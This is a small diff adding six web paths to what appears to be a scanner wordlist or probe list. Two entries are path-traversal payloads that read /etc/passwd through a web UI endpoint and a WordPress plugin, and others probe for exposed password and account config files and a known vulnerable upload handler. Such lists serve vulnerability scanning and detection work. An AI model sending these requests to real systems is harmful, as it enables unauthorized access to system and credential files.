@@ -1,0 +1,6 @@
+/current_config/Sha1Account1
+/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152
+/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd
+/password.jsn
+/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
+/service/v1/service-details
